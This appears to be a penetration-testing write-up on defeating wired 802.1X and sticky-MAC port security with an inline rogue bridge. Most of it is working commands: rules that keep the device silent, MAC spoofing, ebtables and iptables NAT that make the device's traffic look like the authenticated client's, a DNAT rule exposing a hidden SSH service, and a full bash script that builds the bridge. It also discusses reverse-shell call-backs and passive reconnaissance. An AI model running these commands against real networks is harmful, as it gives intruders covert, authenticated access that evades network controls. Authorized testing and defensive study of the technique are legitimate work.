### Callouts (Both Forward and Reverse)
**Caution:** Be aware of potential pitfalls!

A common configuration for network security includes sticky-MAC address filtering on the wire, combined with 802.1X authentication.

- **MAC Address Consistency:** Ensure that the MAC address of traffic coming out of the bridge matches the client computer's MAC address.
- **802.1X Re-authentication:** 802.1X typically re-authenticates periodically and can usually be forced without causing issues.
- **Port Security Violations:** These are often manually cleared. Tripping port security is undesirable and, unfortunately, easy to do.

### Tripping Sticky MAC Port Security
A single stray source MAC address can trigger port security. It is crucial to ensure no traffic leaves until everything is set up. Start in a dark state and gradually bring up functionality until everything is operational.

### Common Pitfalls
Here are some issues I've encountered while working with port security:

- **Excess Services (e.g., Web Server):**
  - Apache, when it starts, queries a name server for its own IP address, which can generate unexpected traffic.
- **IPv6:**
  - If IPv6 traffic is not NATed, it can cause issues. It's best to disable IPv6.
- **DNS:**
  - Entries in `resolv.conf` can generate unexpected traffic upon startup, depending on the distribution. To avoid this, remove `/etc/resolv.conf` at boot.
- **ARP:**
  - ARP traffic is often the root cause of most problems. Something gets ARP'd, leading to issues.

### Arptables
Arptables allows us to block all ARP traffic from an interface. Since ARP can cause issues, we can easily block all traffic originating from our device using the following command:
```bash
arptables -A OUTPUT -o eth1 -j DROP
```
**Note:** We want ARP traffic to cross the bridge, but not leave as sourced by our rogue device.

### (IP/ARP/EB)tables Chain Flow Overview
- **Prerouting:** All incoming traffic.
- **Forward:** Traffic passing from one interface to another.
- **Input:** Traffic destined for the local device.
- **Output:** Traffic leaving the local device.
- **Postrouting:** All outgoing traffic.

**Notes:**
- All traffic crossing the bridge will traverse the prerouting, forward, and postrouting chains.
- Dropping all traffic from the output chain prevents our device from inadvertently tripping port security without affecting bridge traffic.

### Mimicking the Client
MAC addresses are easy to spoof, but since we're using a bridge (Layer 2), interaction requires Layer 3. We will use a combination of ebtables and iptables to handle our NAT requirements.

### Ebtables
Ebtables functions similarly to iptables at the link layer:
- **Link Layer Filtering:** Provides filtering at the link layer.
- **NAT with MAC Addresses:** Allows us to perform NAT with MAC addresses.

### Communication Channels
We need to communicate with the bridge. We can either contact it directly or have it call us. Either way, traffic originating from the bridge should appear to come from the authenticated machine.

### Master of Disguise
Using iptables and knowing the IP address of the inline computer, we can NAT our traffic using source NAT (SNAT):
```bash
iptables -t nat -A POSTROUTING -s 192.168.1.10 -p tcp -j SNAT --to 1.2.3.4
iptables -t nat -A POSTROUTING -s 192.168.1.10 -p udp -j SNAT --to 1.2.3.4
```

### One Quick Caveat (Perfect World)
Modern TCP/IP stacks track connections using the tuple (SRC IP, SRC PT, DST IP, DST PT). If we communicate with hosts on the same network, we might match an existing connection, leading to a 1 in 65000 chance of overlap. This could adversely affect operations and risk discovery.

### One Quick Caveat (MS Reality ™)
In reality, it's worse. Microsoft limits the range of source ports:
- **XP/2003:** TCP/UDP ports 1025 – 5000
- **Vista/7/2008:** TCP/UDP ports 49152 - 65535

### One Quick Mitigation
Restricting the SNAT ports can eliminate overlap or blend in better. For Vista/7/2008, using ports in the back half of the range can help:
```bash
iptables -t nat -A POSTROUTING -s 192.168.1.10 -p tcp -j SNAT --to 1.2.3.4:61000-62000
iptables -t nat -A POSTROUTING -s 192.168.1.10 -p udp -j SNAT --to 1.2.3.4:61000-62000
```

### Creating a Hidden Service
Use Destination NAT (DNAT) to create a hidden service on our rogue device:
```bash
iptables -t nat -A PREROUTING -d 192.168.1.10 -p tcp --dport 9876 -j DNAT --to 127.0.0.1:22
```
To further restrict access:
```bash
iptables -t nat -A PREROUTING -s 1.2.3.4 -d 192.168.1.10 -p tcp --dport 9876 -j DNAT --to 127.0.0.1:22
```

### Don’t Call Us, We’ll Call You
We can also have the bridge contact us (reverse shell). This makes more sense given the security, as 802.1X networks often don't allow inbound traffic to workstations. Options include SSH, OpenVPN, and others.

### Choosing an IP
We need an IP for the bridge to NAT. An IP in the 169.254.0.0 range is self-assigned and unlikely to be in use on a production network.

### Interaction with the Client
Directly attacking the computer behind the bridge is challenging. We need to source NAT in that direction, and without a good patsy computer, it's difficult.

### The Pre-Populated Setup
**Scenario:**
- Full scope pen test on an organization using wired 802.1X security.
- Physical security team found a hiding spot in a printer stand and returned with a printer configuration page containing necessary network info.

### Bringing It All Together
```bash
#!/bin/bash
SWMAC=f0:ad:4e:00:02:46
COMPMAC=c0:c1:c0:76:35:7c
COMIP=192.168.0.10
GWNET=192.168.0.0/24
DEFGW=192.168.0.15
BRINT=br0
SWINT=eth0
COMPINT=eth3
BRIP=169.254.66.66
DPORT=9876
RANGE=61000-62000

# Build the bridge
brctl addbr $BRINT
brctl addif $BRINT $COMPINT
brctl addif $BRINT $SWINT

# Bring up both sides of the bridge
ifconfig $COMPINT 0.0.0.0 up promisc
ifconfig $SWINT 0.0.0.0 up promisc

# Start dark
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP

# Swap the MAC address to the switch side MAC
macchanger -m $SWMAC $BRINT

# Bring up the bridge with the non-routable IP
ifconfig $BRINT $BRIP up promisc

# Add the network info and default route
route add -net $GWNET dev $BRINT
route add default gw $DEFGW

# Use ebtables to source NAT the $COMPMAC for traffic leaving the device
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC

# Use DNAT to map $DPORT to $BRIP:22
iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22

# Set up the source NAT rules for TCP/UDP/ICMP
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

# Start SSH
/etc/init.d/ssh start

# Lift radio silence
arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP
```

### Automation
1. **Start Transparently:**
2. **Gather Info:**
3. **Analyze Info:**
4. **Bring Up the Bridge:**

### Information Needed
- **IP Address**
- **MAC Address**
- **Network Mask**
- **Gateway IP**

If we can't get this info from recon, we need:
- **IP Address of the Computer**
- **MAC Address of the Computer**
- **MAC Address of the Gateway**

### Using the Gateway MAC
Create a static ARP entry using the gateway MAC with a bogus IP on the same network as the bridge IP. Create a default route to that IP to route to the actual gateway without needing the network mask.

### Typical Network Assumptions
- **Segmented by Function (Server/Workstation)**
- **Central Router/Firewall**
- **Network Services (AD/DNS/WWW) Not in Workstation Segment**

### Passive Aggressive
Passively gather information by watching packets crossing the bridge. Expected traffic includes:
- **UDP (NetBIOS/DNS/LDAP)**
- **ARP**
- **TCP (AD/WWW/Email)**

### UDP Analysis
- **DNS:** Variable amounts
- **LDAP:** Variable amounts
- **NetBIOS/Broadcast Traffic:** Not helpful
- **DHCP/Broadcast Traffic:** Not helpful

### ARP Analysis
ARP is a decent option. Use `tcpdump` to monitor ARP traffic:
```bash
tcpdump -i eth0 -nne arp
```
Example output:
```plaintext
18:26:42.972381 00:26:b9:1b:02:97 > ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: arp who-has 192.168.15.1 tell 192.168.15.129
18:26:37.993919 00:1b:fc:9d:2e:ef > 00:26:b9:1b:02:97, ethertype ARP (0x0806), length 60: arp reply 192.168.15.1 is-at 00:1b:fc:9d:2e:ef
```

### ARP: The Downside
If there are services on the local wire or a lot of intersegment traffic, the most ARP'd entry might not be the gateway.

### ARP Consensus
While not perfect, ARP is a reasonable option. On a reasonably sized network, there should be lots of ARP traffic, and most of it should be heading towards the gateway.